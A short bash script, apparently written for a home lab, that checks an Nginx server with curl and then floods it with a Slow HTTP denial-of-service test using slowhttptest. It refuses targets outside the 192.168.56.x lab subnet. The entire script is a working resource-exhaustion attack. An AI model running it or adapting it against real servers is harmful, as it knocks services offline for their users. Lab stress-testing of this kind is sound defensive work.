#!/usr/bin/env bash
set -Eeuo pipefail

TARGET_IP="${TARGET_IP:-192.168.56.103}"
CONNECTIONS="${CONNECTIONS:-30}"
RATE="${RATE:-5}"
DURATION="${DURATION:-60}"

log() {
  printf '[slow-http] %s\n' "$*"
}

die() {
  printf '[slow-http][ERROR] %s\n' "$*" >&2
  exit 1
}

validate_lab_ip() {
  case "$1" in
    192.168.56.*) ;;
    *) die "IP '$1' bukan subnet lab 192.168.56.x. Script dihentikan." ;;
  esac
}

main() {
  validate_lab_ip "$TARGET_IP"
  command -v slowhttptest >/dev/null 2>&1 || die "Install dulu: sudo apt install -y slowhttptest"
  command -v curl >/dev/null 2>&1 || die "Install dulu: sudo apt install -y curl"

  log "Cek target Nginx"
  curl -I --max-time 5 "http://$TARGET_IP/"

  log "Slow HTTP lokal: connections=$CONNECTIONS rate=$RATE duration=$DURATION"
  slowhttptest -H -c "$CONNECTIONS" -i 10 -r "$RATE" -t GET \
    -u "http://$TARGET_IP/" -x 16 -p 3 -l "$DURATION"
}

main "$@"
